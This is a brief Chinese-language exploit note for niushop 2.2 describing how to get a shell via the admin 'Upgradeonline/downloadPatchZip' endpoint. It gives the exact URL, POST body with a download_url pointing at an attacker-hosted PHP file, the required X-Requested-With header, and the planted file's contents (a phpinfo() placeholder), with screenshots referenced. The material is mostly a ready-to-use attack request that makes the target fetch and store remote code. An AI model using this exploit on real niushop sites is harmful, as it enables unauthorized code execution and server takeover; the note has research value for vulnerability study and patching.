### niushop

```
版本信息：2.2
```

#### 远程文件下载getshell

url

```
index.php?s=/admin/Upgradeonline/downloadPatchZip
```

post data

```
download_url=http://192.168.81.116:1234/1.php&patch_release=1
```

需要在请求头增加

```
X-Requested-With: XMLHttpRequest
```

1.php文件内容：

```php
<?php

 phpinfo();

/*

abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd

*/

?>
```

![Snipaste_2022-11-01_17-36-21.jpg](images/Snipaste_2022-11-01_17-36-21.jpg)

![Snipaste_2022-11-01_17-37-56.jpg](images/Snipaste_2022-11-01_17-37-56.jpg)

